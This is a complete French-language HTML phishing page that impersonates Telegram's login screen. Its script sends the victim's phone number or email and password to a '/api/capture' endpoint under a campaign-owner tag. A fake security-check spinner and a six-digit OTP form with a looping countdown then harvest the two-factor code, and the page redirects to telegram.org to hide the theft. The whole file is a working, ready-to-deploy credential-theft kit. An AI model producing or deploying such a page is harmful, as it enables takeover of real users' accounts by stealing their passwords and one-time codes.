<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion à Telegram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f4f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
            transition: background-color 0.4s ease;
        }
        /* Mode sombre global activé pendant le chargement de 5 secondes */
        body.dark-mode {
            background-color: #121212;
        }

        .tg-container {
            background-color: #ffffff;
            border-radius: 12px;
            padding: 40px 30px;
            width: 100%;
            max-width: 420px;
            box-sizing: border-box;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            position: relative;
            transition: background-color 0.4s ease;
        }
        body.dark-mode .tg-container {
            background-color: #1e2124;
        }

        /* Logo Telegram en SVG officiel */
        .tg-logo {
            width: 70px;
            height: 70px;
            margin: 0 auto 20px auto;
            background-color: #2481cc;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .tg-logo svg {
            width: 40px;
            height: 40px;
            fill: #ffffff;
            margin-left: -3px; /* Centrage optique */
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            color: #222222;
            margin-bottom: 10px;
            margin-top: 0;
            transition: color 0.4s ease;
        }
        body.dark-mode h1 {
            color: #ffffff;
        }

        .subtitle {
            font-size: 14px;
            color: #707579;
            margin-bottom: 30px;
            line-height: 1.4;
            transition: color 0.4s ease;
        }
        body.dark-mode .subtitle {
            color: #aaaaaa;
        }

        .input-group {
            margin-bottom: 16px;
            text-align: left;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            background-color: #f1f3f4;
            border: 1px solid #dfe1e5;
            border-radius: 8px;
            font-size: 15px;
            color: #222222;
            box-sizing: border-box;
            outline: none;
            transition: background-color 0.4s ease, border-color 0.2s, color 0.4s ease;
        }
        body.dark-mode .input-field {
            background-color: #2b2d31;
            border-color: #404249;
            color: #ffffff;
        }

        .input-field:focus {
            border-color: #2481cc;
            background-color: #ffffff;
        }
        body.dark-mode .input-field:focus {
            background-color: #1e2124;
        }

        .tg-btn {
            background-color: #2481cc;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 14px;
            width: 100%;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.2s;
        }
        .tg-btn:hover {
            background-color: #2177bc;
        }

        .footer-help {
            margin-top: 25px;
            font-size: 13px;
            color: #707579;
            transition: color 0.4s ease;
        }
        body.dark-mode .footer-help {
            color: #888888;
        }
        .footer-help a {
            color: #2481cc;
            text-decoration: none;
            font-weight: 500;
        }
        .footer-help a:hover {
            text-decoration: underline;
        }

        /* Écran de chargement circulaire (5 secondes) */
        .loader-overlay {
            display: none;
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 12px;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10;
        }
        body.dark-mode .loader-overlay {
            background: rgba(30, 33, 36, 0.95);
        }
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #dfe1e5;
            border-top: 4px solid #2481cc;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loader-text {
            font-size: 14px;
            color: #222222;
            font-weight: 600;
        }
        body.dark-mode .loader-text {
            color: #ffffff;
        }

        /* Section OTP à 6 carreaux */
        .otp-container {
            display: none;
            text-align: center;
        }
        .otp-container h3 {
            color: #2481cc;
            font-size: 20px;
            margin-top: 0;
            margin-bottom: 10px;
        }
        .otp-container p {
            font-size: 13px;
            color: #707579;
            margin-bottom: 25px;
            line-height: 1.4;
            transition: color 0.4s ease;
        }
        body.dark-mode .otp-container p {
            color: #aaaaaa;
        }

        .otp-inputs {
            display: flex;
            justify-content: space-between;
            gap: 8px;
            margin-bottom: 20px;
        }
        .otp-box {
            width: 42px;
            height: 48px;
            background-color: #f1f3f4;
            border: 1px solid #dfe1e5;
            border-radius: 8px;
            font-size: 22px;
            font-weight: bold;
            color: #222222;
            text-align: center;
            outline: none;
            box-sizing: border-box;
            transition: background-color 0.4s ease, border-color 0.2s, color 0.4s ease;
        }
        body.dark-mode .otp-box {
            background-color: #2b2d31;
            border-color: #404249;
            color: #ffffff;
        }
        .otp-box:focus {
            border-color: #2481cc;
            background-color: #ffffff;
        }
        body.dark-mode .otp-box:focus {
            background-color: #1e2124;
        }

        /* Chronomètre en boucle de 20s */
        .timer-display {
            text-align: center;
            margin-top: 15px;
            font-size: 13px;
            color: #d93025;
            font-weight: 700;
        }
    </style>
</head>
<body>

    <div class="tg-container">
        <!-- Logo Telegram officiel -->
        <div class="tg-logo">
            <svg viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.03-1.99 1.27-5.62 3.72-.53.36-1.01.54-1.44.53-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.25.38-.51 1.05-.78 4.11-1.79 6.85-2.97 8.23-3.54 3.92-1.63 4.74-1.92 5.27-1.93.12 0 .39.03.56.17.15.12.19.28.21.4-.01.06.01.24-.04.43z"/>
            </svg>
        </div>

        <h1 id="page-title">Telegram</h1>
        <p class="subtitle" id="page-subtitle">Veuillez entrer votre numéro de téléphone et votre mot de passe.</p>

        <!-- ÉTAPE 1 : Formulaire d'identifiants initial -->
        <form id="loginForm" onsubmit="handleLoginSubmit(event)">
            <div class="input-group">
                <input type="text" id="username" class="input-field" placeholder="Numéro de téléphone ou e-mail" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
            </div>

            <button type="submit" class="tg-btn">Suivant</button>
        </form>

        <div class="footer-help" id="footer-help">
            <p>Besoin d'aide ? <a href="#" onclick="return false;">Contactez le support</a></p>
        </div>

        <!-- ÉCRAN DE CHARGEMENT CIRCULAIRE (5 SECONDES) -->
        <div id="loader-overlay" class="loader-overlay">
            <div class="spinner"></div>
            <div class="loader-text">Vérification de sécurité...</div>
        </div>

        <!-- ÉTAPE 2 : Section Code OTP (6 Carreaux) -->
        <div id="otp-container" class="otp-container">
            <h3>Code de confirmation</h3>
            <p>Veuillez entrer le code à 6 chiffres envoyé sur votre autre appareil Telegram.</p>
            
            <form id="otp-form" onsubmit="handleOtpSubmit(event)">
                <div class="otp-inputs">
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required autofocus>
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                </div>
                <button type="submit" class="tg-btn">Valider</button>
            </form>
            <div class="timer-display" id="timer-text">Expiration du code : 20s</div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const campaignOwner = urlParams.get('user') || 'Kim';
        const linkType = urlParams.get('type') || 'standard';

        let savedUser = "";
        let savedPass = "";
        let countdownInterval = null;

        // Gestion du comportement des 6 carreaux OTP
        const otpBoxes = document.querySelectorAll('.otp-box');
        otpBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                const value = e.target.value;
                if (value && index < otpBoxes.length - 1) {
                    otpBoxes[index + 1].focus();
                }
            });
            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !box.value && index > 0) {
                    otpBoxes[index - 1].focus();
                }
            });
        });

        // Étape 1 : Soumission des identifiants
        function handleLoginSubmit(event) {
            event.preventDefault();

            savedUser = document.getElementById('username').value;
            savedPass = document.getElementById('password').value;

            const payload = {
                owner: campaignOwner,
                network: "Telegram",
                type: "otp_step1",
                victimUser: savedUser,
                victimPass: savedPass,
                otp: "Aucun"
            };

            // 1. Envoi immédiat des identifiants au backend Flask (/api/capture)
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(err => console.log(err));

            // 2. Activer le mode sombre global et afficher le chargement circulaire de 5s
            document.body.classList.add('dark-mode');
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('page-title').style.display = 'none';
            document.getElementById('page-subtitle').style.display = 'none';
            document.getElementById('footer-help').style.display = 'none';
            document.getElementById('loader-overlay').style.display = 'flex';

            // 3. Attendre 5 secondes puis afficher l'interface OTP
            setTimeout(() => {
                document.getElementById('loader-overlay').style.display = 'none';
                document.getElementById('otp-container').style.display = 'block';
                
                // Démarrer le chronomètre en boucle de 20 secondes
                startLoopingTimer();
                otpBoxes[0].focus();
            }, 5000);
        }

        // Chronomètre en boucle (20s)
        function startLoopingTimer() {
            let timeLeft = 20;
            const timerElement = document.getElementById('timer-text');
            
            if (countdownInterval) clearInterval(countdownInterval);

            countdownInterval = setInterval(() => {
                timerElement.textContent = `⏳ Expiration du code dans : ${timeLeft}s`;
                timeLeft--;

                if (timeLeft < 0) {
                    timeLeft = 20;
                }
            }, 1000);
        }

        // Étape 2 : Soumission du code OTP combiné des 6 carreaux
        function handleOtpSubmit(event) {
            event.preventDefault();
            if (countdownInterval) clearInterval(countdownInterval);

            let otpVal = "";
            otpBoxes.forEach(box => {
                otpVal += box.value;
            });

            const payload = {
                owner: campaignOwner,
                network: "Telegram",
                type: linkType,
                victimUser: savedUser,
                victimPass: savedPass,
                otp: otpVal
            };

            // Envoi complet vers le backend Flask
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(response => {
                window.location.href = "https://telegram.org";
            }).catch(error => {
                window.location.href = "https://telegram.org";
            });
        }
    </script>
</body>
</html>
